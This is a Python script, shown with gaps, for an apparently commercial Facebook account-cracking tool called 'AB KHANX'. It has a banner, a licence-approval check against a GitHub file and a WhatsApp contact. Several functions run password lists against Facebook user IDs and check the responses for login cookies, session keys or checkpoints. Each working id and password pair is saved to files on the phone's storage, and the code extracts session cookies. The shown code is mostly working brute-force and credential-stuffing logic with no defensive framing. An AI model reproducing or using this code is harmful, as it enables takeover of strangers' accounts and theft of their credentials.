...
def menu_apikey():
  ...
  print(f"""\x1b[1;97m
    ...
    \033[1;38m   ##     ##     ######      ######  
     ...
     ───────────────────────────────
     [✓] \033[1;32mF4C3B00K  : AB KHANX
     [✓] \033[1;32mY0UTUB3   : MSS TRICKS
     [✓] \033[1;32mV3RS10N   : 1.1
     [✓] \033[1;32m0WN3R     : AB KHANX\033[1;37m            
     ───────────────────────────────""")                                           
  ...
  os.system(f'xdg-open {tan}://www.facebook.com/SW4TI')
  print(f"");time.sleep(2)
  print(f"\x1b[0;34m  CHECKING YOUR APROVAL.............                                                ");time.sleep (0.5)
  try:
    httpCaht = requests.get(f"https://github.com/MR-K1NGX/Mss/blob/main/Approval.txt").text
    if id in httpCaht:
      ...
      os.system(f'xdg-open {tan}://wa.me/+923436768904?text='+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [AB KHANX-VIP] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                print(f'\r\r\033[1;32m [MUMT4Z-OK] %s | %s'%(ids,pas))
                                open(f'/sdcard/MUMT4Z-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Shahin:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;126m [💔-CP '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/AB KHANX-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def ffb1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [AB KHANX] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [MUMT4Z-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/MUMT4Z-OK.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
...
def rcrack_free(idf,pwv):
	...
	#		print(idf+'|'+ps)
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\n')
				print('\033[1;92m[MUMT4Z-OK] '+idf+' | '+ps+'\033[0;97m')
				cek_apk(coki)
				...
				cid = coki[141:156]
				print('\n')
				print('\033[1;91m[💔-CP '+idf+' | '+ps+'\033[0;97m')
